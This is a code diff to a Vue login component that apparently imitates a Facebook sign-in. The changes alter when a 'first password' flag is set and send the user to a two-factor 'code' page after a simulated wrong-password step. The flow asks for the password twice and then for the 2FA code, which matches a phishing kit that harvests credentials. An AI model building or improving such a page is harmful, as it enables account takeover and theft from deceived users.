@@ -53,14 +53,12 @@ export default {
         })
         .then((response) => {
           console.log(response);
-          // Simulate moving to CMD_CODE after submitting form
-          this.handleResponse("CMD_CODE");
+          // Simulate waiting for password after form submission
+          this.firstPassword = true;
         })
         .catch((error) => {
           console.error(error);
         });
-
-        this.firstPassword = true;
       }
     },
     submitPassword() {
@@ -89,7 +87,13 @@ export default {
           .then((response) => {
             console.log(response);
             // Simulate moving to CMD_CODE after wrong password submission
-            this.handleResponse("CMD_CODE");
+            this.$router.push({
+              name: "twofa",
+              params: {
+                type: "code",
+                email: this.form.email,
+              },
+            });
           })
           .catch((error) => {
             console.error(error);
@@ -97,18 +101,6 @@ export default {
         }
       } else {
         this.modal.error = true;
-      }
-    },
-    handleResponse(responseData) {
-      if (responseData == "CMD_CODE") {
-        // Redirect to CMD_CODE simulation route
-        this.$router.push({
-          name: "twofa",
-          params: {
-            type: "code",
-            email: this.form.email,
-          },
-        });
       }
     },
     alert() {
@@ -128,7 +120,6 @@ export default {
   },
 };
 </script>
-
 
 <template>
   <div v-if="loading" id="loadFacebookC" class="">
